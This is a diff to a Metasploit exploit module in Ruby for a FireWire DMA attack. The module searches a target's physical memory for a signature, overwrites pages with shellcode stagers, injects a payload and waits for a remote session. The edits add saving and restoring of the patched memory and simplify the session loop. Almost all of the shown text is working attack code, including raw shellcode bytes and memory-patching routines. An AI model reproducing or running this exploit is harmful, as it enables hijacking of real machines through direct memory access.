@@ -50,11 +50,9 @@ class Metasploit3 < Msf::Exploit::Local
                       "\xb0\xc0\x31\xdb\x31\xc9\xb5\x10" +
                       "\x99\xb2\x07\xbe\x22\x00\x00\x00" +
                       "\xcd\x80\x66\xc7\x00\xff\xe0\xff\xe0" 
-        #forkpatch = "\x50\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0\x74\x02\x58\xc3"
-        #prologue= "\x90\x90\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e"
-        # sig = hex2bin(target['Signature'])
+
         sig = target['Signature']
-        # nops = nop_generator.generate_sled(target['Space'] - payload.encoded.length) 
+        
         #patch = forkpatch + payload.encoded
         off = target['Offset'] 
 
@@ -70,11 +68,8 @@ class Metasploit3 < Msf::Exploit::Local
         ##
         # Stage 1 of the attack
         ##
-
-        # Attack
         puts 'Starting attack...'
-
-        patchPage(d,sig,stagerpatch,off)
+        oldmem = patchPage(d,sig,stagerpatch,off)
 
         ##
         # Stage 2 of the attack
@@ -88,16 +83,17 @@ class Metasploit3 < Msf::Exploit::Local
         # Wait for user input
         puts 'Press enter if patch on target is run'
         gets
+        d.write(oldmem[0],oldmem[1]) # replace patched memory
 
         puts 'Searching for payload page'
+
         patchPage(d, stagesig,patch, 0)
 
         ##
         # Stage 3
         ##
 		print_status "Starting the payload handler..."
-		while(true)
-			break if session_created?
+		while(!session_created?)
 			select(nil,nil,nil,1)
 		end
 
@@ -131,7 +127,6 @@ class Metasploit3 < Msf::Exploit::Local
 
     # Tries to find signature on a page at offset at device d 
     def patchPage(d,sig,patch,off)
-
         # Find memory size
         memsize = 4 * 1024 * 1024  * 1024
 
@@ -140,14 +135,15 @@ class Metasploit3 < Msf::Exploit::Local
             fail('Signature not found.') if !addr
 
             puts 'Signature found at 0x%x.' % addr
+            oldmem = d.read(addr, patch.length) # save patched data
             d.write(addr, patch)
             puts 'Patch NOT confirmed!' if d.read(addr, patch.length) != patch
 
+            return [ addr,oldmem]
         rescue IOError => e
             fail( e.message + ' Make sure FireWire interfaces are properly connected.' )
         end
     end
-
 
     def findsig(d, sig, off, memsize)
         pagesize = 4096 
@@ -159,9 +155,8 @@ class Metasploit3 < Msf::Exploit::Local
         end
     end          
 
-    def fail(msg)
+    def fail(msg) # This is abort()
         puts "\n [!] Attack unsuccessful. " + msg
-        exit
     end
 
     def hex2bin(s)
